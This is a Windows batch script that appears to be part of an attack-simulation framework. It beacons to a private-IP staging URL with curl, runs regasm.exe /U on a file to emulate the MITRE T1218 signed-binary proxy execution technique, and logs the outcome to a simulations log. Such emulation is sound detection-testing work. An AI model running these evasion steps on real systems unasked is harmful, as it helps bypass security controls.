@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

SET pjkcpgw=
SET ebwae=https://10.0.0.49
SET drguvr=https://10.0.0.49/stage/2/icon.png?7592-10
SET hlbnp=ITZEL-S2B
SET pudaazx=10
SET syjfr=visio.txt
SET ewjmdkff=7592

SET vlnz=%APPDATA%\!pudaazx!\macula-simulations.log
SET kpqwe=T1218
SET ttpnme=Regasm

curl -k -s -o nul !drguvr!

cd /d !pjkcpgw!
SET svfxc=1
SET ghmnq=
regasm.exe /U !syjfr!
IF NOT !errorlevel! EQU 0 (
    SET svfxc=0
    SET ghmnq=assembly_unregister_failed
)

for /f "tokens=2 delims==" %%I in ('wmic os get localdatetime /value') do set datetime=%%I
set dtstp=!datetime:~0,4!-!datetime:~4,2!-!datetime:~6,2!
set tmpstp=!datetime:~8,2!:!datetime:~10,2!:!datetime:~12,2!.!datetime:~15,3!

(
    echo [!dtstp! !tmpstp!][!hlbnp!]: !pudaazx!-!ewjmdkff!-!kpqwe!|!ttpnme!=!svfxc!:!ghmnq!
) >> !vlnz! 2>nul || >nul 2>&1